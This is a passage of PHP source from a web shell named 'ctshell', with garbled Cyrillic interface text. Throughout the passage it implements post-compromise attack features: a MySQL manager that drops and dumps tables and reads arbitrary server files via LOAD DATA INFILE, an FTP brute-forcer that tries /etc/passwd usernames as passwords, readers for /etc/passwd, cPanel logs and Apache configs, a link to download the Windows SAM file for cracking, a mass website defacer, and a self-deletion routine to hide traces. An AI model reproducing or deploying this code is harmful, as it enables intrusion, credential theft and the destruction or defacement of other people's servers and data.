  $err = mysql_error();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_error();}
 }
 else {$sql_sock = false;}
 echo "<b>Ìåíåäæåð SQL:</b><br>";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "ÍÅÒ ÑÂßÇÈ";}
  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index",$sul."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
  if (!$sql_db) {$sqlquicklaunch[] = array("Query","#\" onclick=\"alert('Please, select DB!')");}
  else {$sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query");}
  $sqlquicklaunch[] = array("Server-status",$sul."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
  $sqlquicklaunch[] = array("Server variables",$sul."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
  $sqlquicklaunch[] = array("Processes",$sul."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
  $sqlquicklaunch[] = array("Logout",$sul."act=sql");
 
  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";

  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><u>".$item[0]."</u></a> ] ";}}
  echo "</center>";
 }
 echo "</td></tr><tr>";
 if (!$sql_sock) {?><td  class=td2 width="48%" height="100" valign="top"><center><font size="5"> <br> </font></center>
<li>Åñëè ëîãèí ÿâëÿåòñÿ ïóñòûì, ëîãèí - âëàäåëåö ïðîöåññà. </li>
<li>Åñëè õîçÿèí ÿâëÿåòñÿ ïóñòûì, õîçÿèí - localhost </li>
<li>Åñëè ïîðò ÿâëÿåòñÿ ïóñòûì, ïîðò - 3306 (íåïëàòåæ)</li></td>
<td  class=td2 width="90%" height="1" valign="top">
<TABLE height=1 class=table2 cellSpacing=0 cellPadding=0 width="1%" border=0><tr class=tr2>
<td class=td2>&nbsp;<b><font size=2 color=#000000>Çàïîëíèòå ôîðìó:</font></b><table><tr class=tr2><td class=td2>Èìÿ:</td>
<td  class=td2 align=right>Ïàðîëü:</td></tr><form><input type="hidden" name="act" value="sql"><tr>
<td class=td2><input type="text" name="sql_login" value="root" maxlength="64"></td><td  class=td2 align=right>
<input type="password" name="sql_passwd" value="" maxlength="64"></td></tr><tr class=tr2><td class=td2>Õîñò:</td>
<td class=td2>Ïîðò:</td></tr><tr><td class=td2><input type="text" name="sql_server" value="localhost" maxlength="64"></td>
<td class=td2><input type="text" name="sql_port" value="3306" maxlength="6" size="3"><input type="submit" value="Ñîåäèíèòåñü"></td></tr><tr>
<td class=td2></td></tr></form></table></td><?php }
 else
 {
  if (!empty($sql_db))
  {
?><td width="25%" height="100%" valign="top"><a href="<?php echo $sul."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php
$result = mysql_list_tables($sql_db);
if (!$result) {echo mysql_error();}
else
{
 echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
 $c = 0;
 while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM $row[0]"); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>
"; mysql_free_result($count); $c++;}
 if (!$c) {echo "No tables found in database.";}
}
  }
  else
  {
?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php
$result = mysql_list_dbs($sql_sock);
if (!$result) {echo mysql_error();}
else
{
 ?><form action="<?php echo $sul; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php
 echo "<option value=\"\">Databases (...)</option>
";
 $c = 0;
 while ($row = mysql_fetch_row($result)) {echo "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {echo " selected";} echo ">".$row[0]."</option>
"; $c++;}
}
?></select><hr size="1" noshade>Ïîæàëóéñòà, âûáåðèòå áàçó äàííûõ<hr size="1" noshade><input type="submit" value="Go"></form><?php
  }
  echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
  if ($sql_db)
  {
echo "<center><b>There are ".$c." tables in this DB (".htmlspecialchars($sql_db).").<br>";
if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><u>".$item[0]."</u></a> ] ";}}
echo "</b></center>";

$acts = array("","dump");

if ($sql_act == "query")
{
 echo "<hr size=\"1\" noshade>";
 if ($submit)
 {
  if ((!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act)) {echo "<form method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to  :";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"60\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form>";}
}
if (in_array($sql_act,$acts))
{
 ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $sul; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>SQL-Dump DB:</b><form action="<?php echo $sul; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".$SERVER_NAME."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
 if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
 if ($sql_act == "newtpl")
 {
  echo "<b>";
  if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
 }
 else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_error();}
}
elseif ($sql_act == "dump")
{
 $set = array();
 $set["sock"] = $sql_sock;
 $set["db"] = $sql_db;
 $dump_out = "print";
 if ($dump_out == "print") {$set["print"] = 1; $set["nl2br"] = 1;}
 elseif ($dump_out == "download")
 {
  @ob_clean();
  header("Content-type: ctshell");
  header("Content-disposition: attachment; filename=\"".$f."\";"); 
  $set["print"] = 1;
  $set["nl2br"] = 1;
 }
 $set["file"] = $dump_file;
 $set["add_drop"] = true;
 $ret = mysql_dump($set);
 if ($dump_out == "download") {exit;}
}
else
{
 $result = mysql_query("SHOW TABLE STATUS", $sql_sock) or print(mysql_error()); 
 echo "<br><form method=\"POST\"><TABLE cellSpacing=0 cellPadding=1 bgColor=#333333 borderColorLight=#333333 border=1>";
 echo "<tr>";
 echo "<td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td>";
 echo "<td><center><b>Table</b></center></td>";
 echo "<td><b>Rows</b></td>";
 echo "<td><b>Type</b></td>";
 echo "<td><b>Created</b></td>";
 echo "<td><b>Modified</b></td>";
 echo "<td><b>Size</b></td>";
 echo "<td><b>Action</b></td>";
 echo "</tr>";
 $i = 0;
 $tsize = $trows = 0;
 while ($row = mysql_fetch_array($result, MYSQL_NUM))
 {
  $tsize += $row["5"];
  $trows += $row["5"];
  $size = view_size($row["5"]);
  echo "<tr>";
  echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row[0]."\"></td>";
  echo "<td>&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".$row[0]."</b></a>&nbsp;</td>";
  echo "<td>".$row[3]."</td>";
  echo "<td>".$row[1]."</td>";
  echo "<td>".$row[10]."</td>";
  echo "<td>".$row[11]."</td>";
  echo "<td>".$size."</td>";
  echo "<td>
&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row[0]."`")."\"><img src=\"".$sul."act=img&img=sql_button_empty\" height=\"13\" width=\"11\" border=\"0\"></a>
&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row[0]."`")."\"><img src=\"".$sul."act=img&img=sql_button_drop\" height=\"13\" width=\"11\" border=\"0\"></a>
<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row[0]."`")."\"><img src=\"".$sul."act=img&img=sql_button_insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;
</td>";
  echo "</tr>";
  $i++;
 }
 echo "<tr bgcolor=\"000000\">";
 echo "<td><center><b>»</b></center></td>";
 echo "<td><center><b>".$i." table(s)</b></center></td>";
 echo "<td><b>".$trows."</b></td>";
 echo "<td>".$row[1]."</td>";
 echo "<td>".$row[10]."</td>";
 echo "<td>".$row[11]."</td>";
 echo "<td><b>".view_size($tsize)."</b></td>";
 echo "<td></td>";
 echo "</tr>";
 echo "</table><hr size=\"1\" noshade><img src=\"".$sul."act=img&img=arrow_ltr\" border=\"0\"><select name=\"actselect\">
<option>With selected:</option>
<option value=\"drop\" >Drop</option>
<option value=\"empty\" >Empty</option>
<option value=\"chk\">Check table</option>
<option value=\"Optimize table\">Optimize table</option>
<option value=\"Repair table\">Repair table</option>
<option value=\"Analyze table\">Analyze table</option>
</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form>";
 mysql_free_result($result);
}
  }
  }
  else
  {
$acts = array("","newdb","serverstat","servervars","processes","getfile");
if (in_array($sql_act,$acts))
{
 ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Ñîçäàéòå íîâûé Áàçó:</b><form action="<?php echo $sul; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Ñîçäàòü"></form></td><td width="30%" height="1"><b>Ïðèñìîòðåòü Ôàéëà:</b><form action="<?php echo $sul; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Âçÿòü"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
}
if (!empty($sql_act))
{
 echo "<hr size=\"1\" noshade>";
 if ($sql_act == "newdb")
 {
  echo "<b>";
  if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
  else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_error();}
 }
 if ($sql_act == "serverstatus")
 {
  $result = mysql_query("SHOW STATUS", $sql_sock); 
  echo "<center><b>Server-status variables:</b><br><br>";
  echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>value</b></td></tr>";
  while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
  echo "</table></center>";
  mysql_free_result($result);
 }
 if ($sql_act == "servervars")
 {
  $result = mysql_query("SHOW VARIABLES", $sql_sock); 
  echo "<center><b>Server variables:</b><br><br>";
  echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>value</b></td></tr>";
  while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";} 
  echo "</table>";
  mysql_free_result($result);
 }
 if ($sql_act == "processes")
 {
  if (!empty($kill)) {$query = 'KILL ' . $kill . ';'; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
  $result = mysql_query("SHOW PROCESSLIST", $sql_sock); 
  echo "<center><b>Ïðîöåññû:</b><br><br>";
  echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td>STATE</td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
  while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
  echo "</table>";
  mysql_free_result($result);
 }
 elseif (($sql_act == "getfile"))
 {
  if (!mysql_create_db("tmp_bd")) {echo mysql_error();}
  elseif (!mysql_select_db("tmp_bd")) {echo mysql_error();}
  elseif (!mysql_query('CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );')) {echo mysql_error();}
  else {mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file"); $query = "SELECT * FROM tmp_file"; $result = mysql_query($query); if (!$result) {echo "Error in query \"".$query."\": ".mysql_error();}
  else
  {
for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
$f = ""; 
while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {foreach ($line as $key =>$col_value) {$f .= $col_value;}}
if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b>";}
else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f));}
  }
  mysql_free_result($result);
  if (!mysql_drop_db("tmp_bd")) {echo ("Can't drop tempory DB \"tmp_bd\"!");}
  }
 }
}
  }
 }
 echo "</tr></table></table>";
}
if ($act == "mkdir")
{
 if ($mkdir != $d) {if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";} elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}}
 echo "<br><br>";
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "<b>Ftp Quick brute:</b><br>";
 if ($win) {echo "This functions not work in Windows!<br><br>";}
 else
 {
  function ctftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
if ($fqb_onlywithsh)
{
 if (!in_array($sh,array("/bin/bash","/bin/sh","/usr/local/cpanel/bin/jailshell"))) {$true = false;}
 else {$true = true;}
}
else {$true = true;}
if ($true)
{
 $sock = @ftp_connect($host,$port,$timeout);
 if (@ftp_login($sock,$login,$pass))
 {
  echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
  ob_flush();
  return true;
 }
}
  }
  if (!empty($submit))
  {
if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
$fp = fopen("/etc/passwd","r");
if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
else
{
 ob_flush();
 $i = $success = 0;
 $ftpquick_st = getmicrotime();
 while(!feof($fp))
 { 
  $str = explode(":",fgets($fp,2048));
  if (ctftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
  {
$success++;
  }
  if ($i > $fqb_lenght) {break;}
  $i++;
 } 
 if ($success == 0) {echo "No success. connections!";}
 $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
 echo "<hr size=\"1\" noshade><b>Done!<br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=\"green\"><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br><b>Connects per second: ".round($i/$ftpquick_t,2)."</b><br>";
}
  }
  else {echo "<form method=\"POST\"><br>Read first: <input type=\"text\" name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br><input type=\"submit\" name=\"submit\" value=\"Brute\"></form>";}
 }
}
if ($act == "lsa")
{
 echo "<center><b>Èíôîðìàöèÿ áåçîïàñíîñòè ñåðâåðà:</b></center>";
 echo "<b>Ïðîãðàììíîå îáåñïå÷åíèå:</b> ".PHP_OS.", ".$SERVER_SOFTWARE."<br>";
 echo "<b>Áåçîïàñíîñòü: ".$hsafemode."</b><br>";
 echo "<b>Îòêðûòûé îñíîâíîé äèðåêòîð: ".$hopenbasedir."</b><br>";
 if (!$win)
 {
  if ($nixpasswd)
  {
if ($nixpasswd == 1) {$nixpasswd = 0;}
$num = $nixpasswd + $nixpwdperpage;
echo "<b>*nix /etc/passwd:</b><br>";
$i = $nixpasswd;
while ($i < $num)
{
 $uid = posix_getpwuid($i);
 if ($uid) {echo join(":",$uid)."<br>";}
 $i++;
}
  }
  else {echo "<br><a href=\"".$sul."act=lsa&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
  if (file_get_contents("/etc/userdomains")) {echo "<b><font color=\"green\"><a href=\"".$sul."act=f&f=userdomains&d=/etc/&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
  if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=\"green\"><a href=\"".$sul."act=f&f=accounting.log&d=/var/cpanel/&ft=txt\"><u><b>View cpanel logs</b></u></a></font></b><br>";}
  if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=\"green\"><a href=\"".$sul."act=f&f=httpd.conf&d=/usr/local/apache/conf/&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
  if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=\"green\"><a href=\"".$sul."act=f&f=httpd.conf&d=/etc/&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";
  if (file_get_contents($v)) {echo "<b><font color=\"red\">You can't crack winnt passwords(".$v.") </font></b><br>";}
  else {echo "<b><font color=\"green\">Âû ìîæåòå âçëîìàòü winnt ïàðîëè. <a href=\"".$sul."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Ñêà÷àòü</b></u></a>, c èñïîëüçîâàíèå lcp.crack+.</font></b><br>";}
 }
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
 else
 {
  echo "<b>File-System buffer</b><br><br>";
  $ls_arr = $arr;
  $disp_fullpath = true;
  $act = "ls";
 }
}
if ($act == "selfremove")
{
 if (!empty($submit))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using ctshell v.".$cv."!"; exit; }
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
  $v = array();
  for($i=0;$i<8;$i++) {$v[] = "<a href=\"".$sul."\"><u><b>NO</b></u></a>";}
  $v[] = "<a href=\"#\" onclick=\"if (confirm('Are you sure?')) document.location='".$sul."act=selfremove&submit=1';\"><u>YES</u></a>";
  shuffle($v);
  $v = join("&nbsp;&nbsp;&nbsp;",$v);
  echo "<b>Ñàìîóäàëèòü: ".__FILE__." <br>Âû óâåðåííû?</b><center>".$v."</center>";
 }
}
if ($act == "massdeface")
{
 if (empty($deface_in)) {$deface_in = $d;}
 if (empty($deface_name)) {$deface_name = "(.*)"; $deface_name_regexp = 1;}
 if (empty($deface_text_wwo)) {$deface_text_regexp = 0;}

 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;

  $text = $deface_text;
  $text_regexp = $deface_text_regexp;
  if (empty($text)) {$text = " "; $text_regexp = 1;}

  $a = array
  (
"name"=>$deface_name, "name_regexp"=>$deface_name_regexp,
"text"=>$text, "text_regexp"=>$text_regxp,
"text_wwo"=>$deface_text_wwo,
"text_cs"=>$deface_text_cs,
"text_not"=>$deface_text_not
  );
  $defacetime = getmicrotime();
  $in = array_unique(explode(";",$deface_in));
  foreach($in as $v) {ctfsearch($v);}
  $defacetime = round(getmicrotime()-$defacetime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
$ls_arr = $found;
$disp_fullpath = true;
$act = $dspact = "ls";
  }
 }
 else
 {
  if (empty($deface_preview)) {$deface_preview = 1;}

 }
 echo "<form method=\"POST\">";
 if (!$submit) {echo "<big><b>Attention! It's a very dangerous feature, you may lost your data.</b></big><br><br>";}
 echo "<input type=\"hidden\" name=\"d\" value=\"".$dispd."\">
<b>Deface for (file/directory name): </b><input type=\"text\" name=\"deface_name\" size=\"".round(strlen($deface_name)+25)."\" value=\"".htmlspecialchars($deface_name)."\">&nbsp;<input type=\"checkbox\" name=\"deface_name_regexp\" value=\"1\" ".gchds($deface_name_regexp,1," checked")."> - regexp
<br><b>Deface in (explode \";\"): </b><input type=\"text\" name=\"deface_in\" size=\"".round(strlen($deface_in)+25)."\" value=\"".htmlspecialchars($deface_in)."\">
<br><br><b>Search text:</b><br><textarea name=\"deface_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($deface_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"deface_text_regexp\" value=\"1\" ".gchds($deface_text_regexp,1," checked")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_wwo\" value=\"1\" ".gchds($deface_text_wwo,1," checked")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_cs\" value=\"1\" ".gchds($deface_text_cs,1," checked")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"deface_text_not\" value=\"1\" ".gchds($deface_text_not,1," checked")."> - find files <u>NOT</u> containing the text
<br><input type=\"checkbox\" name=\"deface_preview\" value=\"1\" ".gchds($deface_preview,1," checked")."> - <b>PREVIEW AFFECTED FILES</b>
<br><br><b>Html of deface:</b><br><textarea name=\"deface_html\" cols=\"122\" rows=\"10\">".htmlspecialchars($deface_html)."</textarea>
<br><br><input type=\"submit\" name=\"submit\" value=\"Deface\"></form>";
 if ($act == "ls") {echo "<hr size=\"1\" noshade><b>Deface took ".$defacetime." secs</b><br><br>";}
}
if ($act == "search")
{
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}

 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $a = array
  (
"name"=>$search_name, "name_regexp"=>$search_name_regexp,
"text"=>$search_text, "text_regexp"=>$search_text_regxp,
"text_wwo"=>$search_text_wwo,
"text_cs"=>$search_text_cs,
"text_not"=>$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v)
  {
ctfsearch($v);
  }
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
$ls_arr = $found;
$disp_fullpath = true;
$act = $dspact = "ls";
  }
 }
 echo "<form method=\"POST\">
<input type=\"hidden\" name=\"d\" value=\"".$dispd."\">
<b>Search for (file/directory name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".gchds($search_name_regexp,1," checked")."> - regexp
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".gchds($search_text_regexp,1," checked")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".gchds($search_text_wwo,1," checked")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".gchds($search_text_cs,1," checked")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".gchds($search_text_not,1," checked")."> - find files <u>NOT</u> containing the text
<br><br><input type=\"submit\" name=\"submit\" value=\"Search\"></form>";
 if ($act == "ls") {echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs</b><br><br>";}
}
if ($act == "chmod")
{
 $perms = fileperms($d.$f);
 if (!$perms) {echo "Can't get current mode.";}
 elseif ($submit)
 {
  if (!isset($owner[0])) {$owner[0] = 0;}
  if (!isset($owner[1])) {$owner[1] = 0; }
  if (!isset($owner[2])) {$owner[2] = 0;}
  if (!isset($group[0])) {$group[0] = 0;}
  if (!isset($group[1])) {$group[1] = 0;}
  if (!isset($group[2])) {$group[2] = 0;}
  if (!isset($world[0])) {$world[0] = 0;}
  if (!isset($world[1])) {$world[1] = 0;}
  if (!isset($world[2])) {$world[2] = 0;}
  $sum_owner = $owner[0] + $owner[1] + $owner[2];
  $sum_group = $group[0] + $group[1] + $group[2];
  $sum_world = $world[0] + $world[1] + $world[2];
  $sum_chmod = "0".$sum_owner.$sum_group.$sum_world;
  $ret = @chmod($d.$f, $sum_chmod);
  if ($ret) {$act = "ls";}
  else {echo "<b>Èçìåíåíèå Àòðèáóò Ôàéëà (".$d.$f.")</b>: Îøèáêà<br>";}
 }
 else
 {
